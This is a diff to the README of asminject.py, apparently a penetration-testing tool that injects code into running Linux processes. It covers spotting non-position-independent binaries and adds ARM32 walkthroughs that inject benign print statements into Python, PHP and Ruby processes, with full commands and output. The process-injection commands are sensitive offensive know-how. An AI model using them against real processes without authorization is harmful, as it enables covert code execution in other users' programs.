@@ -479,7 +479,7 @@ This payload requires relative offsets for the `libc` shared library used by the
 
 ### Specifying non-PIC code
 
-Some binaries are compiled without the position-independent code build option (including, strangely enough, Python 3.x, even though 2.x had it enabled). This means that the offsets in the corresponding ELF are absolute instead of relative to the base address. If `asminject.py` detects a low base address (typically indicative of this condition), it will include a warning:
+Some binaries are compiled without the position-independent code build option (including, strangely enough, x86-64 builds of Python 3.x, even though 2.x for x86-64 had it enabled). This means that the offsets in the corresponding ELF are absolute instead of relative to the base address. If `asminject.py` detects a low base address (typically indicative of this condition), it will include a warning:
 
 ```
 [*] '/usr/bin/python3.9' has a base address of 4194304, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python3.9" to your asminject.py options.
@@ -495,12 +495,251 @@ As the message indicates, this type of binary can be manually flagged using one 
 [*] /usr/bin/python3.9: 0x0000000000000000
 ...omitted for brevity...
 [+] Done!
+```
+
+If in doubt, the `file` command can sometimes identify whether the code is position-independent or not. In most cases, it will include the text `pie executable` for position-independent code, but just `executable` for regular code. For example, on x86-64 Linux, Python 2.7 is position-independent, but Python 3.9 is not:
 
 ```
+# file /usr/bin/python2.7
+
+/usr/bin/python2.7: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2e424007a240d090ed9d3965398d9d79298f0a37, for GNU/Linux 3.2.0, stripped
+
+# file /usr/bin/python3.9
+
+/usr/bin/python3.9: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18e54a049c2ca8e609eaea044df101effead3b23, for GNU/Linux 3.2.0, stripped
+```
+
+On the other hand, on ARM32 Linux running on a Raspberry Pi, neither Python 2.7 and 3.7 are position-independent, but `libc` is.
+
+```
+# file /usr/bin/python2.7
+
+/usr/bin/python2.7: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=2ab8406bc7cc1bef1e255e4e20a5b1f15758cacf, stripped
+
+# file /usr/bin/python3.7
+
+/usr/bin/python3.7: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=fd15ce8be633e2667c780b770eec5ecf01641017, stripped
+```
+
+However, just to be confusing, x86-64 Linux describes `libc` as a "shared object", without indicating that it's position-independent:
+
+```
+# file /usr/lib/x86_64-linux-gnu/libc-2.33.so
+
+/usr/lib/x86_64-linux-gnu/libc-2.33.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0bea38a0bc75e09b36838f9b6680de85ba65f15, for GNU/Linux 3.2.0, stripped
+```
+
+...but ARM2 Linux describes `libc` as a "pie executable"
+
+```
+# file /lib/arm-linux-gnueabihf/libc-2.28.so
+
+/lib/arm-linux-gnueabihf/libc-2.28.so: ELF 32-bit LSB pie executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, BuildID[sha1]=efdd27c16f5283e5c53dcbd1bbc3ef136e312d1b, for GNU/Linux 3.2.0, stripped
+```
+
+If you want to be sure, run a copy of the target in `gdb`, and check whether the offsets of known functions are relative to the base address or not. For example, the following shell output indicates that the base address for `/usr/bin/python2.7` is 0x00010000, and the list of offsets indicates that the `PyGILState_Ensure` function is as 0x0018b428:
+
+```
+# cat /proc/14629/maps
+
+00010000-0028f000 r-xp 00000000 b3:07 523346     /usr/bin/python2.7
+...omitted for brevity...
+
+grep PyGILState_Ensure relative_offsets-python2.7.txt
+
+0018b428 PyGILState_Ensure
+```
+
+If `/usr/bin/python2.7` was position-independent, then the `PyGILState_Ensure` function would be at address 0x0019b428. In `gdb`, disassembling at this address produces what seems at least superficially like valid code:
+
+```
+(gdb) disassemble 0x19B428, 0x0019b450
+Dump of assembler code from 0x19b428 to 0x19b450:
+   0x0019b428:	sub	r4, r4, #1
+   0x0019b42c:	cmn	r4, #1
+   0x0019b430:	orr	r6, r6, r10, lsl r11
+   0x0019b434:	bne	0x19b418
+   0x0019b438:	and	r9, r9, #31
+   0x0019b43c:	mov	r7, #1
+   0x0019b440:	sub	r10, r3, #-1073741823	; 0xc0000001
+   0x0019b444:	orr	r11, r6, r7, lsl r9
+=> 0x0019b448:	ldr	r10, [r1, r10, lsl #2]
+   0x0019b44c:	mov	r4, #0
+```
+
+However, if `/usr/bin/python2.7` was *not* position-independent, then the `PyGILState_Ensure` function would be at address 0x0018b428 instead, and disassembling there reveals labels for that function:
+
+```
+(gdb) disassemble 0x18b428, 0x1b8450
+Dump of assembler code from 0x18b428 to 0x1b8450:
+   0x0018b428 <PyGILState_Ensure+0>:	ldr	r3, [pc, #140]	; 0x18b4bc <PyGILState_Ensure+148>
+   0x0018b42c <PyGILState_Ensure+4>:	push	{r4, r5, r6, lr}
+   0x0018b430 <PyGILState_Ensure+8>:	ldr	r0, [r3]
+   0x0018b434 <PyGILState_Ensure+12>:	bl	0x14853c <PyThread_get_key_value>
+   0x0018b438 <PyGILState_Ensure+16>:	subs	r4, r0, #0
+   0x0018b43c <PyGILState_Ensure+20>:	beq	0x18b47c <PyGILState_Ensure+84>
+   0x0018b440 <PyGILState_Ensure+24>:	ldr	r1, [pc, #120]	; 0x18b4c0 <PyGILState_Ensure+152>
+```
+
+In this case (Python 2.7 on ARM32 Linux), the binary was *not* position-independent, and using `asminject.py` successfully required adding the option `--non-pic-binary "/usr/bin/python.*"`.
 
 ### Multi-architecture support
 
-{{TKTK: update this after fixing ARM32 support }}
+Experimental support for ARM32 was added in version 0.7 of `asminject.py`, and full support was added in version 0.15. Add the `--arch arm32` option to use ARM32 stager code and payloads. The examples in this section were executed on a Raspberry Pi.
+
+#### Injecting Python code into a Python 3 process:
+
+Terminal 1:
+
+```
+pi@bt-minion1:~/asminject/practice $ python3 ./python_loop.py
+
+2022-05-16T22:16:18.425058 - Loop count 0
+2022-05-16T22:16:23.430401 - Loop count 1
+```
+
+Terminal 2:
+
+```
+# ps auxww | grep python
+
+pi       26611  1.8  0.8  14372  7160 pts/0    S+   15:16   0:00 python3 ./python_loop.py
+
+# ./get_relative_offsets.sh /usr/bin/python3.7 > relative_offsets-python3.7.txt
+
+# python3 ./asminject.py 26611 execute_python_code.s --arch arm32 --relative-offsets relative_offsets-python3.7.txt --non-pic-binary "/usr/bin/python.*" --stop-method "slow" --var pythoncode "print('injected python code');"
+
+...omitted for brevity...
+[*] Handling '/usr/bin/python3.7' as non-PIC binary
+...omitted for brevity...
+[*] Restoring original memory content
+[+] Done!
+```
+
+Back in terminal 1:
+
+```
+2022-05-16T22:18:08.541095 - Loop count 22
+injected python code
+2022-05-16T22:18:17.547089 - Loop count 23
+```
+
+#### Injecting Python code into a Python 2 process:
+
+Terminal 1:
+
+```
+pi@bt-minion1:~/asminject/practice $ python2 ./python_loop.py
+
+2022-05-16T22:10:56.017464 - Loop count 0
+2022-05-16T22:11:01.022812 - Loop count 1
+2022-05-16T22:11:06.028053 - Loop count 2
+```
+
+Terminal 2:
+
+```
+# ps auxww | grep python
+
+pi       24704  1.0  2.4  27720 21040 pts/0    S+   15:10   0:00 python2 ./python_loop.py
+
+# ./get_relative_offsets.sh /usr/bin/python2.7 > relative_offsets-python2.7.txt
+
+# python3 ./asminject.py 24704 execute_python_code.s --arch arm32 --relative-offsets relative_offsets-python2.7.txt --non-pic-binary "/usr/bin/python.*" --stop-method "slow" --var pythoncode "print('injected python code');"
+
+                     .__            __               __
+  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
+ / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
+/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
+\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
+        \/                   \/\______|    \/     \/     \/|__|   \/
+
+asminject.py
+v0.15
+Ben Lincoln, Bishop Fox, 2022-05-16
+https://github.com/BishopFox/asminject
+based on dlinject, which is Copyright (c) 2019 David Buchanan
+dlinject source: https://github.com/DavidBuchanan314/dlinject
+
+[*] Handling '/usr/bin/python2.7' as non-PIC binary
+...omitted for brevity...
+[*] Restoring original memory content
+[+] Done!
+```
+
+Back in terminal 1:
+
+```
+2022-05-16T22:11:26.049014 - Loop count 6
+injected python code
+2022-05-16T22:11:35.054965 - Loop count 7
+```
+
+#### Injecting PHP code into a PHP process:
+
+Terminal 1:
+
+```
+pi@bt-minion1:~/asminject/practice $ php ./php_loop.php
+
+2022-05-16T17:08:03-0700 - Loop count 0
+2022-05-16T17:08:08-0700 - Loop count 1
+2022-05-16T17:08:13-0700 - Loop count 2
+```
+
+Terminal 2:
+
+```
+# ps auxww | grep php
+
+pi        4955  0.0  1.6  62616 14068 pts/0    SN+  17:08   0:00 /usr/bin/php ./php_loop.php
+
+# ./get_relative_offsets.sh /usr/bin/php7.3 > relative_offsets-php7.3.txt
+
+# python3 ./asminject.py 4955 execute_php_code.s --arch arm32 --relative-offsets relative_offsets-php7.3.txt --non-pic-binary "/usr/bin/php.*" --stop-method "slow" --var phpcode "echo \\\"Injected PHP code\\\n\\\";" --var phpname PHP 
+
+[*] Handling '/usr/bin/php7.3' as non-PIC binary
+...omitted for brevity...
+[+] Done!
+```
+
+Back in terminal 1:
+
+```
+2022-05-16T17:08:38-0700 - Loop count 7
+Injected PHP code
+2022-05-16T17:08:47-0700 - Loop count 8
+```
+
+#### Injecting Ruby code into a Ruby process:
+
+Terminal 1:
+
+```
+pi@bt-minion1:~/asminject/practice $ ruby ./ruby_loop.rb 
+2022-05-16T16:03:20-07:00 - Loop count 0
+2022-05-16T16:03:25-07:00 - Loop count 1
+```
+
+Terminal 2:
+
+```
+# ps auxww | grep ruby
+
+pi       12000  4.8  0.7  22144  6756 pts/0    Sl+  16:03   0:00 ruby ./ruby_loop.rb
+
+# python3 ./asminject.py 12000 execute_ruby_code.s --arch arm32 --relative-offsets relative_offsets-libruby2.5.5.txt --stop-method "slow" --var rubycode "puts(\\\"Injected Ruby code\\\")"
+
+...omitted for brevity...
+[+] Done!
+```
+
+Back in terminal 1:
+
+```
+2022-05-16T16:04:05-07:00 - Loop count 9
+Injected Ruby code
+```
 
 ### But what about Yama's ptrace_scope restrictions?
 
@@ -508,9 +747,15 @@ If you are an authorized administrator of a Linux system where someone has accid
 
 ## Version history
 
+### 0.15 (2022-05-16)
+
+* ARM32 `execute_python_code.s`, `execute_php_code.s`, `execute_ruby_code.s`, and `copy_file_using_syscalls.s` implemented.
+* Improved set/restore of process priorities and affinities in "slow" mode
+* Updated script output to use architecture-specific register names and output hex values more appropriately for architectures of different word sizes
+
 ### 0.14 (2022-05-15)
 
-* ARM32 stage 1, stage 2 template, and printf.s are working!
+* ARM32 stage 1, stage 2 template, and `printf.s` are working!
 
 ### 0.13 (2022-05-13)
 
